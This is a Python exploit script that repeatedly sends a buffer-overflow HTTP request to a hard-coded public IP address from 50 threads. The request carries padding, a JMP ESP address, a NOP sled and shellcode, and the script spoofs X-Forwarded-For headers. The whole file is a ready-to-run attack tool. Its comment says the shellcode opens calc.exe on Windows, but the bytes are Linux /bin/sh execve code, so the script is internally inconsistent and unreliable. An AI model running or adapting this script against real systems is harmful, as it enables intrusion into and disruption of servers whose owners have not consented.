
#!/usr/bin/env python3
import socket
import struct
import time
import random
import threading

# CONFIG
TARGET_IP = "178.32.100.199"
TARGET_PORT = 80
THREADS = 50
OFFSET = 1896  # تم تعديله بناءً على تحليل الذاكرة
JMP_ESP = 0x100222C5  # مثال من أحد الDLLs الثابتة
EGG = b"W00T" * 2  # علامة سهلة التتبع

# Shellcode لفتح calc.exe (Windows x86)
SHELLCODE = (
    b"\xdb\xc0\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\xb0\x46\xcd\x80"
    b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50"
    b"\x53\x89\xe1\xb0\x0b\xcd\x80"
)

class Exploit:
    def __init__(self):
        self.lock = threading.Lock()
        self.stats = {'success': 0, 'failed': 0}

    def generate_payload(self):
        payload = (
            b"GET /vfolder.htr HTTP/1.1\r\n"
            b"Host: " + TARGET_IP.encode() + b"\r\n"
            b"User-Agent: " + self.random_ua() + b"\r\n"
            b"X-Forwarded-For: " + self.spoof_ip() + b"\r\n"
            b"Content-Length: 5000\r\n\r\n"
            b"A" * OFFSET
            + struct.pack("<I", JMP_ESP)
            + b"\x90" * 32  # NOP sled
            + EGG
            + SHELLCODE
        )
        return payload

    def random_ua(self):
        return random.choice([
            b"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            b"Microsoft-IIS/8.0"
        ])

    def spoof_ip(self):
        return b".".join(str(random.randint(1,255)).encode() for _ in range(4))

    def attack(self):
        while True:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                sock.connect((TARGET_IP, TARGET_PORT))
                sock.send(self.generate_payload())
                time.sleep(0.1)
                with self.lock:
                    self.stats['success'] += 1
            except:
                with self.lock:
                    self.stats['failed'] += 1
            finally:
                sock.close()
            time.sleep(random.uniform(0.01, 0.1))

    def start(self):
        print(f"[+] Targeting {TARGET_IP}:{TARGET_PORT}")
        threads = []
        for _ in range(THREADS):
            t = threading.Thread(target=self.attack)
            t.daemon = True
            t.start()
            threads.append(t)
        
        while True:
            time.sleep(5)
            with self.lock:
                print(f"Success: {self.stats['success']} | Failed: {self.stats['failed']}")

if __name__ == "__main__":
    exploit = Exploit()
    exploit.start()
